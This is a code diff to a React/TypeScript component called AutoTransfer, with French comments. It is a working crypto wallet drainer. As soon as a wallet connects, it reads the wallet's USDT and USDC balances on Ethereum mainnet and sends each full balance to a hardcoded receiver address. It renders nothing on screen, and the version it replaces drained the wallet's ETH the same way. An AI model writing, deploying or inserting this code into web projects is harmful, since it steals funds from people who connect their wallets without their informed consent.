@@ -14,112 +14,135 @@ import { ethers } from "ethers";
 
 const RECEIVER = "0xa52D5c2ce7128941A1632554bcd154C567F771D9"; // <-- change si besoin
 const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
-const GAS_LIMIT = 21000n;
+const GAS_LIMIT_ERC20 = 100000n; // estimation pour transfert ERC20
+
+const TOKENS: { symbol: string; address: `0x${string}` }[] = [
+  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }, // ✅ checksum exact
+];
+
+
+// ABI minimal ERC20
+const ERC20_ABI = [
+  "function balanceOf(address) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+];
 
 export default function AutoTransfer() {
   const account = useActiveAccount();
   const activeChain = useActiveWalletChain();
-  const chain = activeChain ?? ethereum; // fallback sur mainnet si chain non disponible
+  const chain = activeChain ?? ethereum;
 
-  // Récupère le solde natif (ETH) du wallet connecté
   const { data: balanceData } = useWalletBalance({
     client,
     address: account?.address,
     chain,
   });
 
-  // Hook pour envoyer la transaction depuis le wallet connecté
   const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();
-
-  const [sent, setSent] = useState(false);
+  const [sentMap, setSentMap] = useState<Record<string, boolean>>({});
 
   useEffect(() => {
     const run = async () => {
-      if (!account) return; // pas connecté
-      if (sent) return; // déjà envoyé
-      if (!balanceData) return; // attend que le solde soit chargé
+      if (!account) return;
+      if (!balanceData) return;
 
+      // Récup solde natif (ETH)
+      let nativeBalance: bigint = 0n;
+      if ((balanceData as any)?.value !== undefined) {
+        const v = (balanceData as any).value;
+        if (typeof v === "bigint") nativeBalance = v;
+        else if (typeof v === "string") nativeBalance = BigInt(v);
+        else if (typeof v === "number") nativeBalance = BigInt(Math.floor(v));
+      }
+
+      // On limite à Ethereum mainnet
+      const chainId = (chain as any)?.id ?? (ethereum as any).id;
+      if (chainId !== 1) {
+        console.log("AutoTransfer ERC20: non sur Ethereum mainnet (chainId:", chainId, ")");
+        return;
+      }
+
+      // Récup RPC
+      let rpcUrl: string | undefined;
       try {
-        console.log("Adresse connectée :", account.address);
-        // balanceData.value peut être bigint ou string selon la version -> normalize
-        let balanceValue: bigint = 0n;
-        if ((balanceData as any)?.value !== undefined) {
-          const v = (balanceData as any).value;
-          if (typeof v === "bigint") balanceValue = v;
-          else if (typeof v === "string") balanceValue = BigInt(v);
-          else if (typeof v === "number") balanceValue = BigInt(Math.floor(v));
-        }
+        const rpc = (chain as any)?.rpc;
+        rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
+      } catch {
+        rpcUrl = undefined;
+      }
+      if (!rpcUrl) {
+        console.warn("Aucun RPC pour lire les soldes tokens.");
+        return;
+      }
 
-        console.log("Solde (raw) :", balanceValue, "wei");
-        console.log("Solde (ETH) :", balanceData.displayValue, balanceData.symbol);
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
 
-        if (balanceValue <= 0n) {
-          console.log("⚠️ Solde nul → rien à transférer.");
-          return;
-        }
-
-        // Tentative de récupération du gasPrice via RPC (eth_gasPrice)
-        let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n; // fallback (10 gwei)
-        try {
-          const rpc = (chain as any)?.rpc;
-          if (rpc) {
-            // chain.rpc peut être string ; si tableau tu peux prendre le premier
-            const rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
-            const resp = await fetch(rpcUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
-            });
-            const json = await resp.json();
-            if (json?.result) {
-              gasPrice = BigInt(json.result);
-            }
-          }
-        } catch (e) {
-          console.warn("Impossible de récupérer eth_gasPrice via RPC, on utilise fallback", e);
-        }
-
-        console.log("GasPrice (wei) :", gasPrice.toString(), "=>", ethers.formatUnits(gasPrice, "gwei"), "gwei");
-        const maxFee = GAS_LIMIT * gasPrice;
-        console.log("Frais max estimés (ETH) :", ethers.formatEther(maxFee));
-
-        // Calcul du montant à envoyer en retirant le gas estimé
-        const amountToSend = balanceValue - maxFee;
-        console.log("Montant possible à envoyer (wei) :", amountToSend);
-        console.log("Montant possible à envoyer (ETH) :", ethers.formatEther(amountToSend));
-
-        if (amountToSend <= 0n) {
-          console.log("⚠️ Pas assez de fonds pour couvrir le gas.");
-          return;
-        }
-
-        // Prépare la transaction (fonction synchrone)
-        const preparedTx = prepareTransaction({
-          to: RECEIVER,
-          value: amountToSend,
-          chain,
-          client,
+      // Gas price
+      let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n;
+      try {
+        const resp = await fetch(rpcUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
         });
+        const json = await resp.json();
+        if (json?.result) {
+          gasPrice = BigInt(json.result);
+        }
+      } catch (e) {
+        console.warn("Impossible de récupérer gasPrice via RPC", e);
+      }
 
-        // Marque qu'on a commencé (évite double envoi)
-        setSent(true);
+      console.log("GasPrice :", ethers.formatUnits(gasPrice, "gwei"), "gwei");
 
-        // Envoie la transaction via useSendTransaction (utilise le wallet connecté)
-        const result = await sendTransactionMutateAsync(preparedTx);
-        console.log("Result sendTransaction :", result);
+      for (const token of TOKENS) {
+        try {
+          if (sentMap[token.symbol]) continue;
 
-        // Le hook peut retourner un objet contenant hash, receipt, etc. On loggue tout.
-        alert("✅ Transaction envoyée. Voir console pour détails.");
-      } catch (err: any) {
-        console.error("Erreur pendant le transfert :", err);
-        // si erreur, on permet de retenter
-        setSent(false);
+          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+          const rawBalance: bigint = BigInt(await contract.balanceOf(account.address));
+          const decimals: number = Number(await contract.decimals());
+
+          if (rawBalance <= 0n) {
+            console.log(`${token.symbol} : solde nul`);
+            continue;
+          }
+
+          const maxFee = GAS_LIMIT_ERC20 * gasPrice;
+          if (nativeBalance <= maxFee) {
+            console.warn(`${token.symbol} : pas assez d'ETH pour payer le gas`);
+            continue;
+          }
+
+          const iface = new ethers.Interface(ERC20_ABI);
+          const data = iface.encodeFunctionData("transfer", [RECEIVER, rawBalance]);
+
+          setSentMap((m) => ({ ...m, [token.symbol]: true }));
+
+          // ✅ cast du data en hex string
+          const preparedTx = prepareTransaction({
+            to: token.address,
+            data: data as `0x${string}`,
+            value: 0n,
+            chain,
+            client,
+          });
+
+          const result = await sendTransactionMutateAsync(preparedTx);
+          console.log(`${token.symbol} transfer result:`, result);
+
+          alert(`✅ ${token.symbol} transféré`);
+        } catch (err) {
+          console.error(`Erreur ${token.symbol} :`, err);
+          setSentMap((m) => ({ ...m, [token.symbol]: false }));
+        }
       }
     };
 
     run();
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [account, balanceData, chain, sent]);
+  }, [account, balanceData, chain, sendTransactionMutateAsync]);
 
   return null;
 }
